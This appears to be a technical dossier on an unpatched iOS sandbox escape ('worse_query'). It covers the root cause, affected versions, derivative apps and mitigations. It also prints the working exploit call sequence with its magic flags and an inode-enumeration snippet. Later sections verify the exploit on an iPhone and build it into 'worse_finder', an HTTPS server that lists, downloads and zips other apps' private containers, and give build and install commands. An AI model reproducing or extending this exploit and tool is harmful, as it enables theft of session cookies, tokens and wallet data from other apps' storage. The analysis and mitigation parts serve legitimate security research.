# worse_query: an iOS sandbox escape dossier

Compiled 2026-11-12. Sources: the PoC repo itself (cloned and read), WQ Files, Regitela,
Erosion, the jbjflab Gitea mirror, plus press/write-ups (Ostorlab, SECNEWS, Security
Affairs, Binance, crypto.news).

---

## 1. What it is

`worse_query` is a **userspace iOS sandbox escape**: an app that holds *any* App Group
entitlement can obtain a sandbox extension for an **arbitrary absolute path** by
replacing its own group's `Library/Caches` with a symlink and then asking
`containermanagerd` for an extension on that "part" of its container.

- No jailbreak, no kernel exploit, no root helper, no kernel R/W.
- Author: Taj C (`forcequit`, `forcequitOS`), with `0xjohnny`.
- Successor to `bad_query` (2026-08-11), which used path traversal in
  `container_query_operation_set_part_domain`.
- License GPL-3.0. Repo created **2026-11-08 17:00Z**, two commits, ~551 stars / 128 forks
  within 3 days. Code itself is dated 2026-08-20 and circulated privately before the drop
  (Erosion, created 2026-08-23, credits it).
- The author is explicit: *"This is not relevant to a jailbreak and never will be."*

## 2. Status

| Item | Value |
|---|---|
| CVE | none assigned |
| Apple advisory | none; `worse_query` is not named in any security note |
| Claimed vulnerable | iOS/iPadOS 26.0 to 26.7.2, iOS 27.0 to 27.2 |
| Reported still working | 27.2.1 and 27.3 beta 1 (author, 2026-11-10). Erosion's README agrees. |
| Released 2026-11-09, no fix listed | iOS 27.2.1 (9 CVEs, none a sandbox escape), iOS 26.7.3 |
| Exploited in the wild | no reports of attacks or theft |
| KEV | not listed (no CVE) |

Disclosure context: the author says Apple was stalling, and published anyway, forfeiting
any bounty. Binance warned users on 2026-11-10; SlowMist (23pds) amplified. Trust Wallet
and Zerion said their iOS users were unaffected.

## 3. Root cause

Two ingredients, both in the app's own sandbox:

1. **The app controls the symlink.** An App Group container is writable by the app. The
   code deletes `<group>/Library/Caches` and recreates it as a symlink to `target`.
2. **`containermanagerd` resolves the part path and issues an extension for the
   resolution.** The private query API lets a client ask for a *part* of a container
   (`part 3` = `Library/Caches`). The manager resolves that path through the filesystem
   and mints a sandbox extension for the **resolved** path, without checking that the
   canonical result is still inside the container root.

The missing check is exactly: *resolve, then verify the canonical path is a descendant of
the container's canonical root, and refuse otherwise* (plus TOCTOU hardening, because the symlink
can be swapped between check and use).

Nothing kernel-side is broken; the kernel honours a token that `containermanagerd` should
never have issued. That is why this survives OS updates that fix kernel bugs and why it
works on both 26 and 27.

### The call sequence (from `worse_query/worse_query.m`)

```c
void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW|RTLD_LOCAL);
// container_query_create / set_class / set_group_identifiers /
// operation_set_flags / operation_set_part / get_single_result /
// free / copy_sandbox_token   (+ sandbox_extension_consume from libsystem_sandbox)

query_set_class(query, 7);                      // MCMSharedDataContainer (App Group)
query_set_group_identifiers(query, xpc_string_create(group));
query_set_part(query, 3);                       // Library/Caches
query_set_flags(query, alt ? 0x0000000800000000ULL   // 1<<35, needed for
                           : 0x0000008000000000ULL); // App Groups on iOS 26
                                                // 1<<39 otherwise

[files removeItemAtPath:caches error:nil];
[files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil];

void *result = query_get_single_result(query);  // -> containermanagerd (XPC)
char *token  = copy_sandbox_token(result);      // class;...;path string
int64_t h    = sandbox_extension_consume(token); // sandbox widened to `target`
```

Then `clean_symlink()` restores a real `Library/Caches` and `worse_query_release(h)` calls
`sandbox_extension_release`.

Flags are empirically derived magic (`1<<39` default, `1<<35` for iOS 26 App Group
targets); no public header documents them.

### Delta vs bad_query

| | bad_query (Aug 2026) | worse_query (Nov 2026) |
|---|---|---|
| Primitive | `container_query_operation_set_part_domain("../../../../.." + path)`, traversal in the part domain | symlink at `Library/Caches`, no part_domain at all |
| Classes used | 7 (App Group) and 13 (`MCMSharedSystemDataContainer` → `containermanagerd_system`, MobileGestalt SystemGroup) | 7 only |
| iOS 26 | App Group *sacrifice* required for App Group targets | plain App Group |
| Reach | same path set | same, plus `Shared/AppGroup` parent on 27 |

`bad_query` died when the part-domain traversal got validated; `worse_query` sidesteps the
validated field entirely.

## 4. Reach

From the README:

```
/var/containers/Data/System                      (iOS 27)
/var/containers/Shared/SystemGroup/*             (iOS 27)
/var/mobile/Containers/Data/Application/*
/var/mobile/Containers/Data/InternalDaemon/*
/var/mobile/Containers/Data/PluginKitPlugin/*
/var/mobile/Containers/Shared/AppGroup/*
/var/mobile/Containers/Shared/AppGroup           (iOS 27, the parent, listable)
```

On iOS 26 you get app / extension / daemon / app-group containers only, with no System Data,
no system groups. That asymmetry is why Regitela's Supervision and region edits are
27-only, and why WQ Files hides those two areas on 26.

`/var/containers/Bundle/Application` (app bundles) is *not* in the list, but derivative
apps report opening it on some builds, so treat it as version-dependent, not guaranteed.

**Not** reachable through this bug: Keychain. Keychain items are gated by access groups in
`securityd`, not by the filesystem sandbox, so wallets that keep seeds in the Keychain are
not exposed by worse_query alone. The Binance/SlowMist warning is really about apps that
keep secrets in **plaintext files inside their container**. The exposure depends on the
target app's storage choice. Data Protection still applies: `NSFileProtectionComplete`
files are unreadable while the device is locked (the public write-ups do not measure the
per-lock-state picture).

## 5. Requirements, and why the App Store question matters

1. **An App Group entitlement.** Any group works. Nothing is hardcoded; the app reads its
   own entitlements (`SecTaskCopyValueForEntitlement("com.apple.security.application-groups")`).
   A wildcard App ID cannot carry one, so Sideloadly-signed builds fail; AltStore,
   SideStore and Impactor create one automatically.
2. **Private API use** (`dlopen` + `dlsym` of `libsystem_containermanager`), plus creating a
   symlink over your own Caches directory.
3. **The app must run on the device.** Local only; nothing remote.

App Store apps *can* hold App Group entitlements, so entitlement-wise nothing blocks the
technique. The practical barrier is App Review rejecting the private-API usage, which leaves
sideloading, a dev or enterprise certificate, or an app that slips past review as the
realistic paths. Ostorlab lists "can an App Store app reach it" as open; the honest answer is
"yes in principle, blocked by review, not by entitlements".

## 6. Container enumeration (`pathleak`)

The escape needs a target path; container paths are UUID-based, so the PoC ships a second
trick:

```c
// pathleak.m, "the dumbest arbitrary path enumeration"
for (uint64_t inode = 1; inode <= max_inode; inode++) {
    ssize_t n = fsgetpath(buffer, sizeof buffer, &fsid, inode);
    if (n <= 0) continue;                       // -> path for that inode on that volume
    if (strncmp(buffer, prefix, prefix_length)) continue;  // must be under the dir
    if (strchr(buffer + prefix_length + 1, '/')) continue; // direct children only
    ...
}
```

`fsgetpath()` is callable from a sandboxed app and leaks full paths for inode numbers, so
brute-forcing inodes enumerates the whole data volume's directory names, which is far
cheaper than brute-forcing 36-char UUIDs. The PoC seeds `max_inode` from a file it creates
itself (its own inode is a good upper bound). Cost: minutes on a used device, ~an hour on
iOS 26 for a full scan.

Cheaper alternatives used downstream:

- **LaunchServices database** (`lsd`'s container) lists every installed app's and
  extension's data container. It is instant, and it is what WQ Files prefers.
- **`getxattr(path, "com.apple.containermanager.identifier")`** maps a container path to its
  bundle ID. Works through the escape; on 27.2 the attribute may be unreadable, hence the
  LaunchServices fallback.
- `container_query_iterate_results_sync` with class 7 (WQ Files uses this for the
  path→identifier map).

## 7. Attack model in practice

```
attacker gets an app onto the device (sideload / enterprise cert / review bypass)
  -> app carries an App Group entitlement
  -> symlink <group>/Library/Caches -> /var/mobile/Containers/Data/Application/<victim>
  -> query class 7 part 3, consume token
  -> read/write the victim's Documents, Library, databases, cookies, caches, prefs
  -> repeat per target; pathleak or lsd DB supplies the UUIDs
```

Impact ceiling: everything another app left in its container: session cookies, cached
mail, SQLite DBs, API tokens, plaintext seeds. Impact floor: Data Protection, Keychain and
anything the app never wrote to disk. An unlocked device with a sideloaded app that ran is
the worst case.

## 8. Ecosystem (this is the real story)

worse_query is a *primitive*; the interesting part is how fast it became installable
products. Within 72 hours:

| Project | What | Notes |
|---|---|---|
| [WQ Files](https://github.com/kolbicz/WQFiles) | file browser / app-data manager / cache cleaner | 629★, GPL-3.0, AltStore+SideStore source, reimplements the technique with a locked, crash-safe Caches swap, 192-grant working set, backups, plist/hex/SQLite editors |
| [Regitela](https://github.com/ichitaso/Regitela) | explorer + tweak toolbox | 84★, GPL-3.0, **must be signed with Impactor** (needs the App Group); adds Supervised Mode toggle and MobileGestalt region edit (US LL/A) on 27; rootless `.deb` variant uses `no-sandbox` instead |
| [Erosion](https://github.com/jailbreakdotparty/Erosion) | customization toolbox (gestalt tweaks, PosterBoard wallpapers, dialer themes) | 749★, biggest consumer; supports 26.0 to 26.6.2 limited, 27.0 to 27.2.1, 27.3b1 |
| Filza 27.2 build (`git.jbjflab.top/admin/filza27.2`) | Filza fork, public + developer variants | dev variant adds a-Shell command set, SSH (mobile/root, `alpine`, :2222), dpkg/apt, mount |
| AppsManager27 (`git.jbjflab.top/admin/AppsManager27`) | Apps Manager 1.8.4 fork | backup/restore/wipe app data via worse_query grants |
| `terminal_worse` | a-Shell 2.3.2 full + worse_query | auto-mounts containers under `~/Documents/_sandbox`; bundle ID spoofed as `com.apple.Terminal` |
| Pocket Poster (worse_query port) | PosterBoard wallpapers | replaced the legacy `.Trash` exploit path |
| [KAMUI](https://github.com/murk-sus/kamui-escape) | iOS 27.x sandbox escape + MobileGestalt editor | 80★, MIT, independent technique; source of the `fsgetpath` enumeration pattern WQ Files credits |
| [Veilpath](https://github.com/everettjf/veilpath) | container explorer | built on **bad_query**, superseded |

`git.jbjflab.top` (Gitea) is the distribution hub for the Chinese-language scene: forks of
`terminal_worse`, `filza27.2`, `AppsManager27`, `Pocket-Poster`, plus a 51-PoC
"iOS 17.0 to 27.1 verification lab" (`cinder27`) and an AppleAVE2 kernel PoC (`ave27`,
CVE-2026-112705). Mirrors, not authors, but that is where the packaged IPAs land.

Consequence: the escape is no longer "a PoC for developers". It ships as a signed,
user-friendly app that edits, deletes and wipes other apps' data, and the same code path is
one `#include` away from a credential stealer.

## 9. Detection and mitigation

**No patch exists.** As of 2026-11-12 nothing Apple has shipped names or fixes this.

- Remove sideloaded apps and unknown configuration profiles
  (Settings → General → VPN & Device Management); check for AltStore/SideStore/signing
  services.
- MDM: block installation outside the managed catalog and alternative marketplaces.
  Screen Time can block installs on unmanaged devices.
- Update anyway. 27.2.1 and 26.7.3 fix nine other CVEs, just not this one.
- Assume exposure if an untrusted app ran: rotate sessions and tokens, move wallet funds to
  a wallet created on a clean device.
- App developers: this is a reminder that the container is not a secret store. Keychain
  and Secure Enclave for anything that matters, `NSFileProtectionComplete` for the rest.
- Detection is weak: no published IoCs, iOS keeps limited app-file access logs. Treat
  absence of logs as no evidence either way.

## 10. Notes if you build on it

- Error codes: `-1` group inaccessible, `-2` dlopen/dlsym failed (unsupported OS),
  `-3` query create failed, `-4` symlink create failed, `-5` query rejected by
  containermanagerd, `-6` kernel refused the extension, `-255` target missing. WQ Files
  adds `-7` token/consume failure, `-8` swap recovery failed, `-9` exception.
- The symlink swap breaks your own group's Caches for the duration. Do it under a lock with
  a durable marker so an interrupted swap can be recovered (WQ Files' `WQCacheSwapBegin` /
  `WQCacheSwapRecover`, flock on `.wq-caches-lock`, `O_NOFOLLOW` open of `Library`).
- The kernel caps how many extensions a process may hold; WQ Files keeps a 192-grant LRU
  and re-grants on demand.
- One extension per target path. `create_dir: true` skips the existence check but the path
  still has to resolve.
- iOS 26 app-group targets need the alternate flag bit, so branch on
  `NSProcessInfo.operatingSystemVersion.majorVersion`.
- The token string is `class;...;path`-shaped; derivatives parse the first `com.apple.*`
  field to log which extension class they got.

## 11. Open questions

- Does iOS 26.7.4 / 27.3 final fix it? Watch for a container-manager change, not a kernel
  CVE.
- Which apps actually keep secrets in plaintext containers? That, not the bug, decides the
  wallet risk. Nobody has published a survey.
- Can an App Store app reach the vulnerable path without tripping review? Unproven either
  way.
- Lock-state behaviour (which containers stay readable on a locked device) is unmeasured in
  public write-ups.

## 12. References

- PoC: https://github.com/forcequitOS/worse_query (`worse_query/worse_query.m`, `pathleak.m`)
- Predecessor: https://github.com/forcequitOS/bad_query
- Technical write-up: https://blog.ostorlab.co/worse-query-ios-sandbox-escape.html
- Disclosure/context: https://secnews.co.uk/2026/11/worse-query-ios-sandbox-escape-apple-bounty-forfeited/,
  https://securityaffairs.com/202788/hacking/ios-sandbox-escape-is-public-and-apple-hasnt-confirmed-a-fix.html
- Apple notes (no mention): https://support.apple.com/en-us/149715, https://support.apple.com/en-us/149716
- Binance warning: https://thehackernews.com/2026/11/binance-warns-of-ios-sandbox-escape.html
- Unpatched-in-27.2.1 follow-up: https://crypto.news/apples-ios-27-2-1-update-leaves-crypto-wallet-security-flaw-unpatched/

---

## 13. Verified on hardware, 2026-11-11

Built with a development team and installed on an iPhone 17 with iOS 27.2 (24B119) with
Developer Mode on. Automatic signing registered the App ID and the App Group; the generated
profile carries the entitlement, so no portal work was needed.

Console output (`xcrun devicectl device process launch --console com.example.worsefinder`):

```
── 1. entitlements ─────────────────────────────────────
  • group.com.example.worsefinder
    container: /private/var/mobile/Containers/Shared/AppGroup/A5DCFF0A-B173-…

── 2. baseline — sandbox intact ────────────────────────
before opendir(/private/var/mobile/Containers/Shared/AppGroup)            EPERM
before opendir(…/SystemGroup/systemgroup.com.apple.mobilegestaltcache)    EPERM
before opendir(/private/var/mobile/Containers/Data/Application)           EPERM
before opendir(/private/var/mobile/Containers/Data/InternalDaemon)        EPERM
before opendir(/private/var/containers/Shared/SystemGroup)                EPERM

── 3. worse_query ──────────────────────────────────────
• /private/var/mobile/Containers/Shared/AppGroup
  ✓ handle 2   class com.apple.app-sandbox.read-write
  OK — 121 entries
• …/systemgroup.com.apple.mobilegestaltcache
  ✓ handle 3   class com.apple.app-sandbox.read-write
  OK — 2 entries
• /private/var/mobile/Containers/Data/Application        ✗ -6 kernel refused
• /private/var/mobile/Containers/Data/InternalDaemon     ✗ -6 kernel refused
• /private/var/containers/Shared/SystemGroup             ✗ -6 kernel refused

── 4. read a system file ───────────────────────────────
stat(com.apple.MobileGestalt.plist)  size 11087 bytes
first 16 bytes: 62 70 6c 69 73 74 30 30 d4 01 02 03 04 05 06 07   (bplist00)

── 5. container enumeration ────────────────────────────
falling back to pathleak: inodes 1…400000
found 239 containers in 0.9s
3 containers granted, Library/Documents listed
RESULT: sandbox escaped.
```

Findings that differ from or sharpen the public write-ups:

- **The issued class is `com.apple.app-sandbox.read-write`.** It is the generic app-sandbox
  class, not a container-specific one. That is why one token covers app containers, app
  groups and system groups alike, and why the escape is a single primitive rather than
  per-area tricks.
- **Parent directories are not reachable**: `/var/mobile/Containers/Data/Application`,
  `/var/mobile/Containers/Data/InternalDaemon` and `/var/containers/Shared/SystemGroup`
  all fail with `-6` (kernel refuses the extension). The README's `…/Application/*` is
  literal: children only. `/var/mobile/Containers/Shared/AppGroup` is the exception and
  lists fine (121 entries).
- **No enumeration is needed for the system groups** on 27: the MobileGestalt cache path is
  a fixed string, and the plist is readable in full.
- `pathleak` with a 400k inode cap finds 239 app containers in under a second on this
  device. The "takes an hour" figure in WQ Files applies to a full-volume scan, not to a
  bounded one.
- The App Group does not need to be pre-registered in the portal by hand; automatic
  signing provisions it, which lowers the bar for the sideloaded-app attacker model.

Nothing was modified on the device beyond the app's own group container; every extension
was released and the group's `Library/Caches` restored at the end of the run.

---

## 14. The Finder build, and what actually works on 27.2

The probe grew into `wqprobe`: a Finder-style app browser plus an HTTP server. Getting
names took five dead ends and one reverse-engineered database.

### Dead ends (all verified on device, iOS 27.2 / 24B119)

| Source | Result |
|---|---|
| `LSApplicationWorkspace` `allApplications` / `allInstalledApplications` / `applicationsOfType:` / `enumerateApplicationsOfType:block:` | 0 entries, every variant |
| `MobileInstallationLookup()` | 0 records |
| `/Applications`, `/System/Applications` | `-6`, kernel refuses the extension |
| `/var/containers/Bundle/Application/*` | `-6`, app bundles are out of reach even with a token |
| `/var/mobile/Library`, `/FrontBoard`, `/MobileInstallation` | `-6` |
| `container_query_iterate_results_sync` (all classes) | 0 results |
| `getxattr(com.apple.containermanager.identifier)` | EPERM |
| `.com.apple.mobile_container_manager.metadata.plist` | EPERM even on `lstat`; hardlinking it into our own container also EPERM |
| `Library/Preferences/*.plist` heuristic | 16/239 containers; +19 from `Saved Application State` |

### What does work

**`+[LSApplicationProxy applicationProxyForIdentifier:]`** answers for any bundle ID.
`localizedName`, `dataContainerURL` and `iconDataForVariant:` all work even though
enumeration is refused. So names need only a bundle ID.

Bundle IDs come from **lsd's CSStore2 database**, which lives in an Internal Daemon
container we can read:

```
/private/var/mobile/Containers/Data/InternalDaemon/9A917055-…/Library/Caches/com.apple.LaunchServices-35651614-v2.csstore
```

Magic `bdsl`, ~8 MB. On 27.2 the bundle records are **0x25c bytes**, each preceded by
`[u32 id][u32 0x25c]`; fields are string references (`id << 2`):

| offset | field |
|---|---|
| +0x0c | bundle identifier |
| +0x6c | data container path |
| +0x70 | bundle name |
| +0x78 | display name |

Strings are `[u32 id][u32 length][UTF-8][NUL]`, padded to 4 bytes. Parsing the store mapped
267 containers on this device; combined with the pathleak scan the app lists **272
containers, 269 with a bundle ID, 248 with a display name**, in ~4 s. Names that the store
only keeps in localized form are filled in by the LS proxy lookup.

### Icons are not obtainable

`iconDataForVariant:` returns a **fixed 16 KB placeholder** for every bundle ID
(`09 00 00 00 80 0c 00 00 00 00 00 00 01 00 00 00 …`, identical bytes for Safari, Messages
and Settings). `_applicationIconImageForBundleIdentifier:` returns nil, and `ISIcon` +
`ISImageDescriptor` hangs without `iconservicesd`. The real artwork sits in
`systemgroup.com.apple.lsd.iconscache/Library/Caches/com.apple.IconsCache/<uuid>`, an
IconServices asset store that would need its own parser. The app falls back to
gradient/initials tiles.

### The server

`WebServer` is a TLS `NWListener` on :8443. The certificate is self-signed (P-256, key in the
keychain). Its subject alternative names cover `worse-finder.local`, `127.0.0.1`, and up to
eight IPv4 addresses the phone has used. A new address re-signs with the same key. There is
no plaintext listener. The Server tab shows the certificate's SHA-256 fingerprint.

```
POST /login               form field `k`, sets an HttpOnly Secure cookie
GET /                     app list
GET /a/<uuid>?p=<path>    directory listing
GET /f/<uuid>?p=<path>    file download
GET /z/<uuid>             build and download a ZIP of the container
```

Auth is a 160-bit password from `SecRandomCopyBytes`, base32, stored in the keychain. The
copied link is `https://<ip>:8443/#k=<password>`. The page posts that fragment and then drops
it, so the secret is not a query parameter. Failed guesses are counted for the whole process:
after five, the server locks out, starting at one second and doubling up to 15 minutes, and
it does not check the password during a lockout. More than eight connections that have not
authenticated are dropped.

An earlier build served plain HTTP on :8080 with a three-word passphrase in `?k=` (about 22
bits, and the one-second delay was per connection). Checked then over the CoreDevice USB
tunnel (`http://<device>:8080`):

```
GET /?k=…                200, 85 KB, 272 apps, 0 blank names
GET /  (no token)        401
GET /a/<safari>?p=Library/Preferences   200, listing
GET /f/<safari>?p=…/com.apple.mobilesafari.plist   200, 8273 B, valid bplist
GET /z/<safari>          200, 14,666,547 B, 237 files, 56 MB uncompressed, unzip -t clean
```

The phone's Wi-Fi address was not reachable from the test machine (`no route to host`, no
ARP entry) even though both were on the same /24. The USB tunnel was the working path,
which says something about how isolated that LAN segment was.

### Build

```sh
cd worse_finder
DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer xcodebuild \
  -project worse_finder.xcodeproj -target worse_finder -configuration Debug -sdk iphoneos \
  SYMROOT=$PWD/build -allowProvisioningUpdates build
xcrun devicectl device install app --device <udid> build/Debug-iphoneos/worse_finder.app
```

Debug launch flags: `--serve` starts the server at launch and prints every address,
`--server-tab` opens on the Server tab.

---

## 15. List hygiene: system apps, duplicates, settings

**Classification.** `LSApplicationProxy.applicationType` answers per bundle ID (enumeration
does not), so each row gets `isSystem = type == 1 || type == 2 || bundleID.hasPrefix("com.apple.")`.
On this device that splits 245 containers into 241 system / 4 user. The container list is
mostly Apple services (`AAUIViewService`, `AccessorySetupUI`, …), not things a person
installed. Hidden by default; a Settings toggle plus a toolbar filter menu bring them back,
and system rows carry a small `system` badge when shown.

**Duplicates are real.** Every reinstall of the same bundle ID leaves the old data container
behind, and lsd's store still maps it to the bundle ID. After ~15 debug installs the list held
33 duplicate rows (one app appeared six times). Dedupe keeps one row per bundle ID,
preferring the container `LSApplicationProxy.dataContainerURL` reports now:

```
[scan] dropped 33 stale duplicate containers
[scan] 245 apps, 242 identified, 222 named, 241 system, layout 27.2, 3.4s
```

Those stale containers are still browsable through the web server, which deliberately lists
everything. Hiding is a phone-UI preference, not a data restriction.

**Settings** (third tab): show system apps, show unidentified containers, rescan, clear cache,
container/visible counts, server state, password, build info.

**Empty states**: scanning, nothing scanned yet, only-system-hidden (with a "Show system apps"
button), and no search matches, each a gradient tile, title, one line of explanation and a
single action.

Debug flag `--empty` forces the empty state for design work.

---

## 16. Why Walkie Talkie looked empty, and what it took to fix

The row pointed at a container that no longer existed, and the live 20 MB one had been
dropped as a duplicate:

```
store 27.2: 274 containers, 2 for com.corentinlarroque.walkie-talkie
  6C290247…  exists=false
  CF1531A6…  exists=true  bytes=20704332  files=102
```

Four bugs behind "file reading and exporting works completely":

1. **Dead containers were listed.** The store keeps containers from earlier installs after
   the folder is gone. Scan now `lstat`s every container and drops the `ENOENT` ones, 37 to
   39 per run on this device, then dedupes per bundle, preferring the container LaunchServices
   reports and otherwise the one with more data. Leftovers stay reachable as "Other
   containers" on the app detail page and as `+N more` links in the web list.
2. **`NSURL.resourceValues` returns nil under the sandbox extension.** Every export reported
   `bytes=0` and the size column read 0. Sizes now come from `stat`/`lstat` everywhere
   (exporter, measure, dedupe weighting).
3. **The ZIP central directory used `st_size`, not the bytes written.** A file that changed
   mid-read produced a CD that disagreed with its local header. The writer now records
   `readTotal`, so `unzip -t` and the totals line up.
4. **Exporting the app's own container hung.** The archive is written inside `tmp/`, the
   enumerator walked into it, and the export read a file that was still growing. Paths are
   normalised (`/var` vs `/private/var`) and the output directory plus the archive itself
   are excluded. Served archives are deleted after transfer and stale `tmp/http-*` dirs are
   cleared at server start.

Also fixed: files the sandbox refuses (the container metadata plist, `EPERM`) were counted
in the reported totals although they never entered the archive.

### Verified end to end

```
scan          244 apps, 241 identified, 221 named, 240 system, 5 apps with 18 groups
routes        244/244 app containers return 200, with no 500s
walkie        CF1531A6 listing: Documents, Library, StoreKit, SystemData, tmp
file          Library/Preferences/__gads__.plist 42 B, sha256 identical to the ZIP entry
file          Library/SplashBoard/…/@3x.ktx 3,457,048 B, sha256 identical
zip           196 entries, 20,703,654 B, unzip -t clean
books         556 files / 59,333,269 B, exporter totals equal unzip's, byte for byte
empty         0 files → 22-byte archive with a valid EOCD
cancel        "Export cancelled.", no partial archive left behind
browser       ~/Library/Preferences, 20 items, __gads__.plist 42 bytes, same as the web server
```

App Groups: `LSApplicationProxy.groupContainerURLs` answers in-sandbox (5 apps, 18 groups:
Safari, Messages, Mail, Books). Group containers list and export like any other; Walkie
Talkie genuinely has none.


---

## 17. Branding

The probe became worse_finder: target, product, scheme, bundle ID
(`com.example.worsefinder`), App Group (`group.com.example.worsefinder`), display name, web
page header, README and the Settings brand card. The `wq_*` C symbols stay, since they are the
worse_query API, not the app.

Icon is generated, not drawn by hand: 2048 px supersampled with PIL, then downscaled to 1024
: a folder filled with one continuous gradient (so no seam at the tab), three file lines, and
a magnifier ring whose handle sits behind it. Three variants ship: default, dark (near-black
background) and tinted (grayscale, iOS applies the tint). The asset catalog compiles to
`Assets.car` with `AppIcon60x60@2x.png`, and `CFBundleIcons` is written into the Info.plist;
the same artwork backs the Settings header through a separate `Brand` imageset.

Signing: automatic signing registers the bundle ID and the App Group on first build. If it
refuses, add the App Groups capability to the target by hand and pick the group in the
developer portal.
